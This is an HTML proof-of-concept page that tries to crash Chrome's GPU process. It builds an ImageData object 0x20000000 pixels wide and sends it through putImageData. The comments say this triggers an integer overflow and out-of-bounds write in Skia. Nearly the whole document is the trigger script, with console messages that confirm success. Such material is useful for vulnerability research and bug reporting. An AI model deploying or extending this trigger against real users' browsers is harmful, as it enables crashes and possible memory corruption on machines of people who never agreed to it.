<!DOCTYPE html>
<html>
<head>
    <title>GPU OOB Write Trigger</title>
</head>
<body>
    <h1>Attempting to crash GPU Process... Check chrome://crashes</h1>
    <canvas id="target-canvas" width="10" height="10"></canvas>
    
    <script>
        setTimeout(() => {
            console.log("[*] Initializing...");
            const canvas = document.getElementById('target-canvas');
            const ctx = canvas.getContext('2d', { willReadFrequently: true });
            
            try {
                // The Magic Number: 0x20000000
                // 0x20000000 * 4 bytes/pixel = 0x80000000 bytes.
                // This triggers the SkTFitsIn<int32_t> integer overflow in Skia!
                console.log("[*] Attempting to create massive ImageData...");
                const massive_width = 0x20000000;
                
                // We create a tiny array but force the width parameter
                const imgData = new ImageData(massive_width, 1);
                
                console.log("[+] ImageData created! Sending to GPU...");
                
                // This sends the WritePixels command to the GPU process
                ctx.putImageData(imgData, 0, 0);
                
                console.log("[!] Command sent! If the GPU process crashes, you have the bug!");
            } catch (e) {
                console.log("[-] Blink blocked it: " + e.message);
            }
        }, 1000);
    </script>
</body>
</html>
